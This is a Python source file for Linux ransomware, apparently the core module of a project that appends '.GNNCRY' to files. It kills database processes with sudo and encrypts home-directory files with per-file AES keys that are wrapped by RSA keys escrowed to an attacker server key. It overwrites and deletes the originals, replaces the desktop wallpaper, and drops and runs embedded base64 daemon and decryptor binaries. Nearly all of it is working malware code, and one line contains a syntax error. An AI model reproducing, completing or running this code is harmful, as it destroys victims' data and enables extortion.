import variables
import asymmetric
import get_files
import symmetric
import enviroment
import generate_keys

import os
import string
import random
import base64
import pickle
import gc

from Crypto.PublicKey import RSA
from Crypto.Hash import MD5
from Crypto.Hash import SHA
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP


def kill_databases():
    mysql = 'sudo mysqld stop; sudo mysql.server stop'
    mongo = 'sudo service mongodb stop; sudo /etc/init.d/mongodb stop'
    postgres = 'sudo pkill -u postgres; sudo pkill postgres'
    
    os.system(mysql)
    os.system(mongo)
    os.system(postgres)


def encrypt_priv_key(msg, key):
    line = msg
    n = 127
    x = [line[i:i+n] for i in range(0, len(line), n)]

    key = RSA.importKey(key)
    cipher = PKCS1_OAEP.new(key)
    cifrado = []
    for i in x:
        ciphertext = cipher.encrypt(i)
        cifrado.append(ciphertext)
    return cifrado


def shred(file_name,  passes=1):

    def generate_data(length):
        chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
        return ''.join(random.SystemRandom().choice(chars) for _ in range(length))

    if not os.path.isfile(file_name):
        return False

    ld = os.path.getsize(file_name)
    with open(file_name,  "w") as fh:
        for _ in range(int(passes)):
            data = generate_data(ld)
            fh.write(data)
            fh.seek(0,  0)
            
    os.remove(file_name)


def start_encryption(files):
    AES_and_base64_path = []
    for found_file in files:
        key = generate_keys.generate_key(128, True)
        AES_obj = symmetric.AESCipher(key)
        
        found_file = base64.b64decode(found_file)

        # try open the file to encrypt it
        try:
            with open(found_file, 'rb') as f:
                file_content = f.read()
        except:
            continue

        encrypted = AES_obj.encrypt(file_content)
        shred(found_file)

        new_file_name = found_file.decode('utf-8') + ".GNNCRY"
        with open(new_file_name, 'wb') as f:
            f.write(encrypted)

        base64_new_file_name = base64.b64encode(new_file_name)

        # list of tuples of AES_key and base64(path)
        AES_and_base64_path.append((key, base64_new_file_name))
    
    return AES_and_base64_path


def menu():

    # create ransomware directory 
    try:
        os.mkdir(variables.ransomware_path)
    except OSError:
        pass

    # killing running database process
    kill_databases()
        
    # get the files in the home directory
    # /home/$USER
    files = get_files.find_files(variables.test)
    for f in files:
        print(f)
    # create RSA object
    rsa_object = asymmetric.assymetric()
    rsa_object.generate_keys()
    
    Client_private_key = rsa_object.private_key_PEM
    Client_public_key = rsa_object.public_key_PEM
    encrypted_client_private_key = encrypt_priv_key(Client_private_key,
                                                    variables.server_public_key)
    
    # save encrypted client private key to disk
    with open(variables.encrypted_client_private_key_path, 'wb') as output:
        pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)
    
    # save client public key to disk
    with open(variables.client_public_key_path, 'wb') as f:
        f.write(Client_public_key)
    
    # Free the memory from keys
    Client_private_key = None
    rsa_object = None
    del rsa_object
    del Client_private_key
    gc.collect()
    
    # Get the client public key back as object
    client_public_key_object =  RSA.importKey(Client_public_key)
    client_public_key_object_cipher = PKCS1_OAEP.new(client_public_key_object)

    # FILE ENCRYPTION STARTS HERE !!!
    aes_keys_and_base64_path = start_encryption(files)
    enc_aes_key_and_base64_path = []

    for _ in aes_keys_and_base64_path:
        aes_key = _[0]
        base64_path = _[1]

        # encrypt with the client public key
        encrypted_aes_key = client_public_key_object_cipher.encrypt(aes_key)
        enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))
    
    # free the old AES keys
    aes_keys_and_base64_path = None
    del aes_keys_and_base64_path
    gc.collect()

    # save to disk -> ENC(AES) BASE64(PATH)
    with open(variables.aes_encrypted_keys_path, 'w') as f:
        for _ in enc_aes_key_and_base64_path:
            line = base64.b64encode(_[0]) + " " + _[1] + "\n"
            f.write(line)

    enc_aes_key_and_base64_path = None
    del enc_aes_key_and_base64_path
    gc.collect()


def drop_daemon_and_decryptor():
    
    with open(variables.decryptor_path,'wb') as f:
        f.write(base64.b64decode(variables.decryptor))

    with open(variables.daemon_path), 'wb') as f:
        f.write(base64.b64decode(variables.daemon))

    os.chdir(variables.ransomware_path)
    os.system('chmod +x daemon')
    os.system('chmod +x decryptor')
    
    # run deamon 
    os.system('./daemon')


def change_wallpaper():
    with open(variables.img_path,
              'wb') as f:
        f.write(base64.b64decode(variables.img))
    gnome = 'gsettings set org.gnome.desktop.background picture-uri {}'\
            .format(variables.img_path)
    
    xfce = '''xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s "{}" ''' \
            .format(variables.img_path)
    
    xfce1 = 'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor1/workspace0/last-image -s "{}"' \
            .format(variables.img_path)

    kde = """dbus-send --session --dest=org.kde.plasmashell --type=method_call /PlasmaShell org.kde.PlasmaShell.evaluateScript 'string:
var Desktops = desktops();                                                                                                                       
for (i=0;i<Desktops.length;i++) {
        d = Desktops[i];
        d.wallpaperPlugin = "org.kde.image";
        d.currentConfigGroup = Array("Wallpaper",
                                    "org.kde.image",
                                    "General");
        d.writeConfig("Image", "file://%s");
}'
""" %(variables.img_path)

    os.system(gnome)
    os.system(xfce)
    os.system(xfce1)
    os.system(kde)


if __name__ == "__main__":
    menu()
    change_wallpaper()
    drop_daemon_and_decryptor()
